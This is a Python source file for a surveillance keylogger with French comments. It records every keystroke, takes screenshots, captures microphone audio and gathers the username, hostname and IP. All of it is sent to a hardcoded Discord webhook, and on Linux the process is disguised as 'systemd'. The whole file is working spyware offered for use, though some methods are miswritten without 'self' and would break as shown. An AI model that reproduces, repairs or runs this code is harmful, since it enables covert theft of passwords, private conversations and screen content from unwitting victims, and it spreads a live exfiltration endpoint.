import requests
import json
from pynput import keyboard
import time
from datetime import datetime
import threading
import os
import platform
import socket
import getpass
from pathlib import Path
import sys
import subprocess
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
from pydub import AudioSegment
import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1443685610924671046/oZEfrV8wSPWVf0kl-OuI8pGa4n2QUchnsYkG-GaE37mBbevsffkVYRd1wQO52IPkZ1eH"

class UltimateKeylogger:

    # Fonction d'enregistrement audio
    def record_audio(filename="audio.mp3", duration=30):
        fs = 22050  # échantillonnage réduit pour fichier plus léger
        print("Enregistrement...")
        audio = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()

        temp_wav = "temp.wav"
        write(temp_wav, fs, audio)

        print("Compression MP3...")
        sound = AudioSegment.from_wav(temp_wav)
        sound.export(filename, format="mp3", bitrate="48k")  # Compression MP3 très léger

        os.remove(temp_wav)  # Supprimer le fichier WAV temporaire
        print(f"Fichier audio sauvegardé : {filename}")
        return filename

    # Fonction d'envoi du fichier audio via webhook
    def send_file_to_webhook(filepath):
        with open(filepath, "rb") as f:
            files = {"file": f}
            response = requests.post(WEBHOOK_URL, files=files)

        if response.status_code == 204:
            print("Fichier envoyé avec succès.")
        else:
            print(f"Erreur lors de l'envoi du fichier : {response.status_code}")

    # Fonction principale pour enregistrer et envoyer l'audio
    def record_and_send_audio():
        filename = record_audio("audio.mp3", duration=30)  # Enregistrement audio de 30 secondes
        send_file_to_webhook(filename)  # Envoi du fichier via webhook
        os.remove(filename)  # Supprimer le fichier audio après envoi
        print("Fichier supprimé après envoi.")

    

    
    def capture_screen(self):
    # 1. Génère un nom unique basé sur la date/heure
        filename = datetime.now().strftime("capture_%Y%m%d_%H%M%S.png")
        
        # 2. Capture l'écran et enregistre l'image temporairement
        img = ImageGrab.grab()
        img.save(filename)

        # 3. Envoi du fichier via le webhook Discord
        try:
            with open(filename, "rb") as f:
                files = {"file": (filename, f, "image/png")}
                requests.post(WEBHOOK_URL, files=files)
            print(f"[OK] Capture envoyée : {filename}")
        except Exception as e:
            print(f"[ERREUR] Échec envoi Discord : {e}")

        # 4. Suppression du fichier local
        try:
            os.remove(filename)
            print(f"[OK] Fichier supprimé : {filename}")
        except Exception as e:
            print(f"[ERREUR] Impossible de supprimer : {e}")


        


    def __init__(self):
        self.keystrokes = ""
        self.session_start = datetime.now()
        self.word_count = 0
        self.special_keys_count = 0
        self.last_activity = time.time()
        self.is_caps_lock = False
        self.session_id = os.urandom(8).hex()
        
        # Configuration
        self.max_keystrokes_per_message = 30
        self.inactivity_threshold = 300  # 5 minutes
        self.auto_send_interval = 60     # 1 minute
        
        # Démarrer les timers
        self.start_timers()

    def get_system_info(self):
        """Récupère les informations système"""
        try:
            return {
                "system": platform.system(),
                "node": platform.node(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "username": getpass.getuser(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "session_id": self.session_id
            }
        except:
            return {"error": "Could not retrieve system info"}

    def send_advanced_embed(self, title, description, color=0x00ff00, fields=None):
        """Envoie un embed Discord avancé"""
        embed = {
            "title": title,
            "description": f"```{description}```" if description else "",
            "color": color,
            "timestamp": datetime.utcnow().isoformat(),
            "footer": {
                "text": f"Session: {self.session_id} | User: {getpass.getuser()}"
            },
            "thumbnail": {"url": "https://cdn-icons-png.flaticon.com/512/6062/6062646.png"},
            "fields": fields or []
        }
        
        payload = {
            "embeds": [embed],
            "username": "Ghost Logger",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/3014/3014277.png"
        }

        try:
            threading.Thread(
                target=lambda: requests.post(WEBHOOK_URL, json=payload, timeout=10)
            ).start()
            return True
        except Exception as e:
            return False

    def send_keystroke_report(self):
        """Envoie un rapport détaillé des keystrokes"""
        if not self.keystrokes.strip():
            return
            
        # Statistiques de session
        duration = datetime.now() - self.session_start
        stats_fields = [
            {"name": "📊 Statistiques", "value": f"**Mots:** {self.word_count}\n**Touches spéciales:** {self.special_keys_count}\n**Durée:** {duration}", "inline": True},
            {"name": "🖥 Système", "value": f"**User:** {getpass.getuser()}\n**Host:** {socket.gethostname()}", "inline": True}
        ]
        
        self.send_advanced_embed(
            "🎹 Keystrokes Captured", 
            self.keystrokes[-1000:],  # Limite à 1000 caractères
            0x3498db,
            stats_fields
        )
        
        self.keystrokes = ""

    def on_press(self, key):
        try:
            self.last_activity = time.time()
            
            # Gestion de Caps Lock
            if key == keyboard.Key.caps_lock:
                self.is_caps_lock = not self.is_caps_lock
                self.keystrokes += f" [CAPS:{'ON' if self.is_caps_lock else 'OFF'}] "
                return

            # Capture avancée avec formatage intelligent
            if hasattr(key, 'char') and key.char:
                char = key.char
                if self.is_caps_lock and char.isalpha():
                    char = char.upper()
                self.keystrokes += char
                
            elif key == keyboard.Key.space:
                self.keystrokes += " "
                self.word_count += 1
                
            elif key == keyboard.Key.enter:
                self.keystrokes += " ↵\n"
                
            elif key == keyboard.Key.backspace:
                self.keystrokes += " ⌫"
                
            elif key == keyboard.Key.tab:
                self.keystrokes += " ⇥"
                
            elif key == keyboard.Key.esc:
                self.keystrokes += " ⎋"
                
            elif key == keyboard.Key.delete:
                self.keystrokes += " ⌦"
                
            elif key in [keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r]:
                self.keystrokes += " ⇧"
                
            elif key in [keyboard.Key.ctrl, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
                self.keystrokes += " ⌃"
                
            elif key in [keyboard.Key.alt, keyboard.Key.alt_l, keyboard.Key.alt_r]:
                self.keystrokes += " ⌥"
                
            elif key == keyboard.Key.cmd:
                self.keystrokes += " ⌘"
                
            elif key == keyboard.Key.up:
                self.keystrokes += " ↑"
                
            elif key == keyboard.Key.down:
                self.keystrokes += " ↓"
                
            elif key == keyboard.Key.left:
                self.keystrokes += " ←"
                
            elif key == keyboard.Key.right:
                self.keystrokes += " →"
                
            elif key == keyboard.Key.home:
                self.keystrokes += " ⇱"
                
            elif key == keyboard.Key.end:
                self.keystrokes += " ⇲"
                
            elif key == keyboard.Key.page_up:
                self.keystrokes += " ⇞"
                
            elif key == keyboard.Key.page_down:
                self.keystrokes += " ⇟"
                
            elif key == keyboard.Key.f1:
                self.keystrokes += " F1"
                
            elif key == keyboard.Key.f2:
                self.keystrokes += " F2"
                
            elif key == keyboard.Key.f3:
                self.keystrokes += " F3"
                
            elif key == keyboard.Key.f4:
                self.keystrokes += " F4"
                
            elif key == keyboard.Key.f5:
                self.keystrokes += " F5"
                
            elif key == keyboard.Key.f6:
                self.keystrokes += " F6"
                
            elif key == keyboard.Key.f7:
                self.keystrokes += " F7"
                
            elif key == keyboard.Key.f8:
                self.keystrokes += " F8"
                
            elif key == keyboard.Key.f9:
                self.keystrokes += " F9"
                
            elif key == keyboard.Key.f10:
                self.keystrokes += " F10"
                
            elif key == keyboard.Key.f11:
                self.keystrokes += " F11"
                
            elif key == keyboard.Key.f12:
                self.keystrokes += " F12"
                
            else:
                key_name = str(key).replace('Key.', '')
                self.keystrokes += f" [{key_name}]"
                
            self.special_keys_count += 1

            # Envoi automatique basé sur la longueur
            if len(self.keystrokes) >= self.max_keystrokes_per_message:
                self.send_keystroke_report()
                self.capture_screen()
                
        except Exception as e:
            pass

    def check_inactivity(self):
        """Vérifie l'inactivité et envoie un rapport"""
        while True:
            time.sleep(60)  # Vérifie toutes les minutes
            
            current_time = time.time()
            if current_time - self.last_activity > self.inactivity_threshold:
                if self.keystrokes.strip():
                    self.send_advanced_embed(
                        "⏸ Inactivity Report", 
                        f"User inactive for {int((current_time - self.last_activity) / 60)} minutes\nLast activity: {self.keystrokes[-100:]}",
                        0xf39c12
                    )
                self.last_activity = current_time

    def auto_send_periodic(self):
        """Envoie périodiquement même si peu de keystrokes"""
        while True:
            time.sleep(self.auto_send_interval)
            if self.keystrokes.strip():
                self.send_advanced_embed(
                    "🕒 Periodic Report",
                    self.keystrokes,
                    0x9b59b6,
                    [{"name": "Type", "value": "Auto-periodic", "inline": True}]
                )
                self.keystrokes = ""

    def start_timers(self):
        """Démarre les timers en arrière-plan"""
        # Timer d'inactivité
        inactivity_thread = threading.Thread(target=self.check_inactivity)
        inactivity_thread.daemon = True
        inactivity_thread.start()
        
        # Timer d'envoi périodique
        periodic_thread = threading.Thread(target=self.auto_send_periodic)
        periodic_thread.daemon = True
        periodic_thread.start()

    def send_startup_report(self):
        """Envoie un rapport de démarrage détaillé"""
        system_info = self.get_system_info()
        
        fields = []
        for key, value in system_info.items():
            fields.append({
                "name": f"🔧 {key.replace('_', ' ').title()}",
                "value": f"`{value}`",
                "inline": True
            })
        
        self.send_advanced_embed(
            "🚀 Ultimate Keylogger Started", 
            f"Session started successfully at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            0x2ecc71,
            fields
        )

    def stealth_mode(self):
        """Active le mode furtif"""
        if hasattr(sys, 'frozen'):  # Si compilé en exécutable
            return
            
        # Renomme le processus (Linux)
        if platform.system() == "Linux":
            try:
                import ctypes
                libc = ctypes.CDLL("libc.so.6")
                libc.prctl(15, b"systemd", 0, 0, 0)  # PR_SET_NAME
            except:
                pass

    def start(self):
        """Démarre le keylogger ultime"""
        # Mode furtif
        self.stealth_mode()
        
        # Rapport de démarrage
        self.send_startup_report()
        
        # Lancer la fonction
        self.record_and_send_audio()
        
        # Capture des keystrokes
        with keyboard.Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                # Rapport de fin
                self.send_advanced_embed(
                    "🛑 Session Ended", 
                    f"Keylogger stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nFinal keystrokes: {self.keystrokes}",
                    0xe74c3c
                )

if __name__ == "__main__":
    # Démarrer le keylogger ultime
    keylogger = UltimateKeylogger()
    keylogger.start()











